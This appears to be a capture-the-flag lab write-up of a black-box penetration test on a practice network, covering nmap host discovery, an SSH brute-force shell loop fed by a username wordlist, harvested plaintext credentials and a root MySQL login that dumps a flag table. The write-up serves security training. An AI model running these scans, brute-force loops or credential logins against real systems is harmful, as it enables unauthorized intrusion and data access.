---
description: >-
  You have been engaged in a Black-box Penetration Test (172.16.64.0/24 range).
  Your goal is to read the flag file on each machine.
---

# Black Box Test 2

## Discover live hosts on the network

```bash
sudo nmap -sn 172.16.64.0/24 --exclude 172.16.64.10 -oN hostAlive.nmap
cat hostAlive.nmap | grep for | awk {'print $5'} > ips.txt
sudo nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open -oG portScan.grep
```

### Hosts Alive

| Host | OS |
| :--- | :--- |
| 172.16.64.81 \(cms.foocorp.io, static.foocorp.io\) | Linux |
| 172.16.64.91 | Linux |
| 172.16.64.92 | Linux |
| 172.16.64.166 | Linux |

## Open Ports and Running Services

### 172.16.64.81 \(flag in mysql\)

| Port Number | Service | Version |
| :--- | :--- | :--- |
| 22 | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80 | http | Apache httpd 2.4.18 \(Ubuntu\) |
| 13306 | mysql | MySQL 5.7.25-0ubuntu0.16.04.2 |

### 172.16.64.91

| Port Number | Service | Version |
| :--- | :--- | :--- |
| 80 | http | Apache httpd 2.4.18 \(Ubuntu\) |
| 6379 | redis | Redis key-value store |

### 172.16.64.92

| Port Number | Service | Version |
| :--- | :--- | :--- |
| 22 | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 \(Ubuntu Linux; protocol 2.0\) |
| 53 | 53 | dnsmasq 2.75 |
| 80 | http | Apache httpd 2.4.18 \(Ubuntu\) |
| 63306 | mysql | MySQL 5.7.25-0ubuntu0.16.04.2 |

### 172.16.64.166 \(flag under sabrina user\)

| Port Number | Service | Version |
| :--- | :--- | :--- |
| 2222 | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 \(Ubuntu Linux; protocol 2.0\) |
|  8080 | http | Apache httpd 2.4.18 \(Ubuntu\) |

## Machines

### 172.16.64.166

![](../.gitbook/assets/image%20%285%29.png)

```text
elizabeth 
Lopez
elizabethlopez
elopez
managingdirector
director
manager  
tara
baker
tarabaker
tbaker
designer
beckycasey
becky
casey
bcasey
project
manager 
projectmanager
randy
carlson
randycarlson
rcarlson
developer
pabloroberts
pablo
roberts
proberts
founder
bessiehammond
bessie
hammond
bhammond
programmer 
gerardomalone
gerardo
malone
gmalone
juniordesigner
junior
designer
sabrina 
summers
sabrinasummers
ssummers
analyst
```

```bash
#!/bin/sh

for user in $(cat users.txt); 
do
    echo "Trying '$user'..."
    sshpass -p CHANGEME ssh -p 2222 $user@172.16.64.166 2>/dev/null
    if [ $? -eq 0 ]; then
        exit
    fi
done;
```

```bash
sabrina@xubuntu:~$ cat flag.txt 
Congratulations! You have successfully exploited this machine.
Go for the others now.
```

```text
sabrina@xubuntu:~$ cat hosts.bak 
127.0.0.1       localhost
172.16.64.81    cms.foocorp.io
172.16.64.81    static.foocorp.io

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

### 172.16.64.81

![](../.gitbook/assets/image%20%286%29.png)

```text
john1john1:password123
peter:youdonotguessthatone5
```

### 172.16.64.92

```text
X-DB-Key: x41x41x412019!
X-DB-User: root
X-DB-name: mysql
```

![](../.gitbook/assets/image%20%284%29.png)

```bash
# Tried:
# mysql --host=172.16.64.92 --user=root --password=x41x41x412019! --port 63306 mysql
# Working:

mysql --host=172.16.64.81 --user=root --password=x41x41x412019! --port 13306 mysql
> show databases;
> use cmsbase;
> show tables;
+----------------------------+
| Tables_in_cmsbase          |
+----------------------------+
| flag                       |
| sqlmapfile                 |
| tbl_1_actions_log          |
| tbl_1_categories           |
| tbl_1_categories_relations |
| tbl_1_downloads            |
| tbl_1_files                |
| tbl_1_files_relations      |
| tbl_1_folders              |
| tbl_1_groups               |
| tbl_1_members              |
| tbl_1_members_requests     |
| tbl_1_notifications        |
| tbl_1_options              |
| tbl_1_password_reset       |
| tbl_1_users                |
| tbl_actions_log            |
| tbl_categories             |
| tbl_categories_relations   |
| tbl_downloads              |
| tbl_files                  |
| tbl_files_relations        |
| tbl_folders                |
| tbl_groups                 |
| tbl_members                |
| tbl_members_requests       |
| tbl_notifications          |
| tbl_options                |
| tbl_password_reset         |
| tbl_users                  |
+----------------------------+
30 rows in set (0.141 sec)

MySQL [cmsbase]> select * from cmsbase.flag
    -> ;
+----+------------------------------+
| id | content                      |
+----+------------------------------+
|  1 | Congratulations, you got it! |
+----+------------------------------+
1 row in set (0.141 sec)

```

